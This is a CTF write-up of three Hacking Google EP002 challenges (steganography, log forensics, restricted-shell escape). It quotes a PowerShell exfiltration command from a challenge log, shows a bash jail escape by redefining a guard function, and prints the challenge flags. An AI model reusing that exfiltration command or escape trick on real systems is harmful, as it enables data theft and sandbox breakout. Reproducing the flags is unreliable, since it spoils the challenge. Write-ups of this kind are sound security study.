---
description: "My writeup for EP002 of the Hacking Google CTF : Detection & Response."
authors:
  - techbrunch
date: 2022-10-19
links:
  - blog/posts/hacking-google-operation-aurora.md
tags:
  - CTF
categories:
  - WriteUp
---

# Hacking Google EP002 - Detection & Response

My writeup for EP000 of the Hacking Google CTF : Operation Aurora.

<!-- more -->

## Challenge 01 - Steganography

> This image might look familiar. But where have you seen it before?

> Hint: Sometimes the answers are hidden in plain site

We are provided with a PNG image:

```
❯ file challenge.png
challenge.png: PNG image data, 1326 x 462, 8-bit/color RGBA, non-interlaced
```

The hint suggest that we look at a simmilar image. The image is the same image displayed as the background on the website. If we compare the two they are different:

```
❯ md5sum website.png
ff8251f71d342e60b52083150baeaddd  website.png
❯ md5sum challenge.png
60cace3aa51d065870abe7be308d8bc1  challenge.png
```

Checking for strings in the one from the website returns some information in the textual information chunks (metadata[^metadata-png]):

[^metadata-png]: [The Metadata in PNG files](https://dev.exiv2.org/projects/exiv2/wiki/The_Metadata_in_PNG_files)

``` hl_lines="6 7 9 10 11"
❯ strings website.png
IHDR
pHYs
sRGB
gAMA
tEXtAuthor
Crash OverrideR

iTXtComment
D&R found our last message
so just using base64-encoding isn't going to be enough...
```

The full message appears to indicate that what we are looking for is hidden certificate and that steganography is being used to hide it in an image:

> D&R found our last message 🙃 so just using base64-encoding isn't going to be enough. Maybe hide it in an SSL certificate? Should pass DLP checks. And use LSB stego, I'm sure that'll fool them. I found an online tool that works to read it (I'll send you a link) so we can probably deprecate your custom decoding tool. Oh and remember to delete this message before you check in the changes 🤐.

Using [StegOnline](https://stegonline.georgeom.net/image) we can clearly see that something is present at the beginning of the file in bit 0 for R, G, B and Alpha. Using a [Cyberchef recipe](https://gchq.github.io/CyberChef/#recipe=Extract%5FLSB%28%27R%27%2C%27G%27%2C%27B%27%2C%27A%27%2C%27Row%27%2C0%29) we can extract the certificate from the image:

```
-----BEGIN CERTIFICATE-----
MIIDZzCCAk8CFBoKXnXdnNubl8olJdv40AxJ9wksMA0GCSqGSIb3DQEBBQUAMHAx
CzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZadXJpY2gxOzA5BgNVBAoMMmh0dHBzOi8v
aDRjazFuZy5nb29nbGUvc29sdmUvNTNjdXIxVHlfQnlfMGI1Q3VyMXRZMRMwEQYD
VQQDDApnb29nbGUuY29tMB4XDTIyMDkzMDE4NTEwNVoXDTMyMDkyNzE4NTEwNVow
cDELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBlp1cmljaDE7MDkGA1UECgwyaHR0cHM6
Ly9oNGNrMW5nLmdvb2dsZS9zb2x2ZS81M2N1cjFUeV9CeV8wYjVDdXIxdFkxEzAR
BgNVBAMMCmdvb2dsZS5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQDCX25BoQBBndrOiS6L11/RwWf6FNS+fUct7CLq9yMxU+xJ+yPVFZa7+trkvwe0
IXWduNIb/USvtOb8I8X8H/MHVMCypBQisFMxHnZmv2D/QVRySIJpMdah8va+LL5o
7Dv0LD73ynGUw8rW8VQUrlGF5cJRSgd3ZVbDUjR33GD4TjdIChzs/WMZGSP7c/lk
sSLMd2eCYbdwo5pz7KaYa7ta0b3gf055q4E/uJ00TUN26GkYOi/c7PZrgQu+hXR6
onn2HhkBNrloUlZaI5kJ2v3QRHt2UxnAhS7YVpQ6ZS4h8LQf6mvnZ/Zx71SyZmkk
AuvhSjU8bCeIypSC82RbEi6fAgMBAAEwDQYJKoZIhvcNAQEFBQADggEBABj1PIHB
cKJgxEXo6AT+8OMYWFd2mtthM2HsioevNvmpsAQjjlPRfY3E9DF7H49XagnON3YM
dDvN4IwmHSRKIemdEyc/D2+Dr/Ky5FSU6NymUiUGUGV+aDGXIFV/NOaq0b9ASbBh
78TLN2+/Val933tHWQpPqmpw30v4XknYPF5R+ghqr9r9A0dVPstDmq1HBOuazWJe
DBUBHenbSW6EPnFYZc8zuCSLZtIJvlAryJrmcFWTridUmtXjM5Lyh05LFAFVH6wl
z0sVEvisfE9aw4zfotBsV6zvgOL1ypYsX20KJ6zIJycRBkWgmOzQxKCZ5fxfKCFT
8mr99Mujp9EBzPA=
-----END CERTIFICATE-----
```

When parsed using [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Parse_X.509_certificate%28%27PEM%27%29&input=LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURaekNDQWs4Q0ZCb0tYblhkbk51Ymw4b2xKZHY0MEF4Sjl3a3NNQTBHQ1NxR1NJYjNEUUVCQlFVQU1IQXgKQ3pBSkJnTlZCQVlUQWtOSU1ROHdEUVlEVlFRSURBWmFkWEpwWTJneE96QTVCZ05WQkFvTU1taDBkSEJ6T2k4dgphRFJqYXpGdVp5NW5iMjluYkdVdmMyOXNkbVV2TlROamRYSXhWSGxmUW5sZk1HSTFRM1Z5TVhSWk1STXdFUVlEClZRUUREQXBuYjI5bmJHVXVZMjl0TUI0WERUSXlNRGt6TURFNE5URXdOVm9YRFRNeU1Ea3lOekU0TlRFd05Wb3cKY0RFTE1Ba0dBMVVFQmhNQ1EwZ3hEekFOQmdOVkJBZ01CbHAxY21samFERTdNRGtHQTFVRUNnd3lhSFIwY0hNNgpMeTlvTkdOck1XNW5MbWR2YjJkc1pTOXpiMngyWlM4MU0yTjFjakZVZVY5Q2VWOHdZalZEZFhJeGRGa3hFekFSCkJnTlZCQU1NQ21kdmIyZHNaUzVqYjIwd2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUIKQVFEQ1gyNUJvUUJCbmRyT2lTNkwxMS9Sd1dmNkZOUytmVWN0N0NMcTl5TXhVK3hKK3lQVkZaYTcrdHJrdndlMApJWFdkdU5JYi9VU3Z0T2I4SThYOEgvTUhWTUN5cEJRaXNGTXhIblptdjJEL1FWUnlTSUpwTWRhaDh2YStMTDVvCjdEdjBMRDczeW5HVXc4clc4VlFVcmxHRjVjSlJTZ2QzWlZiRFVqUjMzR0Q0VGpkSUNoenMvV01aR1NQN2MvbGsKc1NMTWQyZUNZYmR3bzVwejdLYVlhN3RhMGIzZ2YwNTVxNEUvdUowMFRVTjI2R2tZT2kvYzdQWnJnUXUraFhSNgpvbm4ySGhrQk5ybG9VbFphSTVrSjJ2M1FSSHQyVXhuQWhTN1lWcFE2WlM0aDhMUWY2bXZuWi9aeDcxU3labWtrCkF1dmhTalU4YkNlSXlwU0M4MlJiRWk2ZkFnTUJBQUV3RFFZSktvWklodmNOQVFFRkJRQURnZ0VCQUJqMVBJSEIKY0tKZ3hFWG82QVQrOE9NWVdGZDJtdHRoTTJIc2lvZXZOdm1wc0FRampsUFJmWTNFOURGN0g0OVhhZ25PTjNZTQpkRHZONEl3bUhTUktJZW1kRXljL0QyK0RyL0t5NUZTVTZOeW1VaVVHVUdWK2FER1hJRlYvTk9hcTBiOUFTYkJoCjc4VExOMisvVmFsOTMzdEhXUXBQcW1wdzMwdjRYa25ZUEY1UitnaHFyOXI5QTBkVlBzdERtcTFIQk91YXpXSmUKREJVQkhlbmJTVzZFUG5GWVpjOHp1Q1NMWnRJSnZsQXJ5SnJtY0ZXVHJpZFVtdFhqTTVMeWgwNUxGQUZWSDZ3bAp6MHNWRXZpc2ZFOWF3NHpmb3RCc1Y2enZnT0wxeXBZc1gyMEtKNnpJSnljUkJrV2dtT3pReEtDWjVmeGZLQ0ZUCjhtcjk5TXVqcDlFQnpQQT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQ) we get the flag:

``` hl_lines="10 15"
Version:          1 (0x00)
Serial number:    148664996155893488627904951239968879597233572140 (0x1a0a5e75dd9cdb9b97ca2525dbf8d00c49f7092c)
Algorithm ID:     SHA1withRSA
Validity
  Not Before:     30/09/2022 18:51:05 (dd-mm-yyyy hh:mm:ss) (220930185105Z)
  Not After:      27/09/2032 18:51:05 (dd-mm-yyyy hh:mm:ss) (320927185105Z)
Issuer
  C  = CH
  ST = Zurich
  O  = https://h4ck1ng.google/solve/53cur1Ty_By_0b5Cur1tY
  CN = google.com
Subject
  C  = CH
  ST = Zurich
  O  = https://h4ck1ng.google/solve/53cur1Ty_By_0b5Cur1tY
  CN = google.com
```

## Challenge 02 - Forensic

> After recent attacks, we’ve developed a search tool. Search the logs and discover what the attackers were after. HINT: Use the tool to be forensic in your search.

For this challenge we are given two files:

```
❯ tree
.
├── CTF CSV-EASY-final.csv
└── Readme.md

0 directories, 2 files
```

The README explains that we should use [timesketch](https://timesketch.org/), an open-source tool for collaborative forensic timeline analysis, to analyze the CSV file and find the exfiltration channel used by the attacker.

While I liked the idea of using a CTF challenge to push people to try new tools, it was a bit too easy to find the flag without actually using timesketch:

```
❯ cat CTF\ CSV-EASY-final.csv|grep http
2022-06-24 10:27:55+00,Event Time,ALLOW,"PROCESS_LAUNCH by entity tech01 on asset kiosk.detectorsprotectors.biz : powershell.exe -ExecutionPolicy Bypass -C $SourceFile=(Get-Item #{host.dir.compress});$RemoteName=""exfil-xbhqwf-$($SourceFile.name)"";cloud gs cp #{transferwiser.io} gs://#{01000110 01001100 01000001 01000111 00111010.https://h[4]ck[1]n/g.go[og]le/s[ol]ve/d3_T3c_i0n_r35P_0ns3
```

Just visit: https://h4ck1ng.google/solve/d3_T3c_i0n_r35P_0ns3 to solve the challenge

## Challenge 03 - Quarantine Shell

> Welcome to the shell. See if you can leave. socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337

> Hint: How can you ask the shell for which commands are available?

If we run the command we end up in a quarantined shell, if we use tab completion we can see a list of command:

```
❯ socat FILE:`tty`,raw,echo=0 TCP:quarantine-shell.h4ck.ctfcompetition.com:1337
== proof-of-work: disabled ==
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

   ___                                    _    _                ____   _            _  _
  / _ \  _   _   __ _  _ __  __ _  _ __  | |_ (_) _ __    ___  / ___| | |__    ___ | || |
 | | | || | | | / _` || `__|/ _` || `_ \ | __|| || `_ \  / _ \ \___ \ | `_ \  / _ \| || |
 | |_| || |_| || (_| || |  | (_| || | | || |_ | || | | ||  __/  ___) || | | ||  __/| || |
  \__\_\ \__,_| \__,_||_|   \__,_||_| |_| \__||_||_| |_| \___| |____/ |_| |_| \___||_||_|

The D&R team has detected some suspicious activity on your account and has quarantined you while they investigate
952 days stuck at ~
~ $
!                    enable               quarantine_protocol
.                    esac                 read
:                    eval                 readarray
[                    exec                 readonly
[[                   exit                 return
]]                   export               select
_dnr_toolkit         false                set
alias                fc                   shift
bg                   fg                   shopt
bind                 fi                   source
break                for                  suspend
builtin              function             test
caller               getopts              then
case                 hash                 time
cd                   help                 times
command              history              trap
compgen              if                   true
complete             in                   type
compopt              jobs                 typeset
continue             kill                 ulimit
coproc               let                  umask
declare              local                unalias
dirs                 logout               unset
disown               mapfile              until
do                   popd                 wait
done                 printf               while
echo                 pushd                {
elif                 pwd                  }
else                 quarantine
~ $
```

If we can use tab completion and path traversal to list files and directories:

```
~ $ ../../
bin/                lib32/              root/
boot/               lib64/              run/
default_serverlist  libx32/             sbin/
dev/                login.sh            srv/
dnr_helpers.sh      media/              sys/
etc/                mnt/                tmp/
flag                opt/                usr/
home/               proc/               var/
lib/                quarantine.sh
```

We can see that the flag is at `/flag`.

I used this small Python script to fuzz what was available:

```python
from pwn import *
context.log_level = 'error'
for command in [b'!', b'.', b':', b'[', b'[[', b']]', b'_dnr_toolkit', b'alias', b'bg', b'bind', b'break', b'builtin', b'caller', b'case', b'cd', b'command', b'compgen', b'complete', b'compopt', b'continue', b'coproc', b'declare', b'dirs', b'disown', b'do', b'done', b'echo', b'elif', b'else', b'enable', b'esac', b'eval', b'exec', b'exit', b'export', b'false', b'fc', b'fg', b'fi', b'for', b'function', b'getopts', b'hash', b'help', b'history', b'if', b'in', b'jobs', b'kill', b'let', b'local', b'logout', b'mapfile', b'popd', b'printf', b'pushd', b'pwd', b'quarantine', b'quarantine_protocol' b'read' b'readarray' b'readonly' b'return' b'select' b'set' b'shift' b'shopt' b'source' b'suspend' b'test' b'then' b'time' b'times' b'trap' b'true' b'type' b'typeset' b'ulimit' b'umask' b'unalias' b'unset' b'until' b'wait' b'while' b'{', b'}']:
    r = remote('quarantine-shell.h4ck.ctfcompetition.com', 1337)
    r.recvuntil(b'$ ')
    r.sendline(command)
    data = r.recvrepeat(0.1)
    r.close()
```

We can notice that entering `!` will return an error giving us a bit of insight on how the jail works:

```
command blocked: trap quarantine_protocol DEBUG
check completions to see available command
```

In the end thanks to some hint from my coworkers I managed to solve it by redefining the `quarantine_protocol` and calling it:

```
~ $ quarantine_protocol () { ls; }
~ $ quarantine_protocol
bash: ls: No such file or directory
~ $ quarantine_protocol () { ../../flag;}
~ $ quarantine_protocol
../../flag: /usr/share/bashdb/bashdb-main.inc: No such file or directory
../../flag: warning: cannot start debugger; debugging mode disabled
../../flag: line 1: https://h4ck1ng.google/solve/Y0U_c0mpL3T3_M3: No such file or directory
```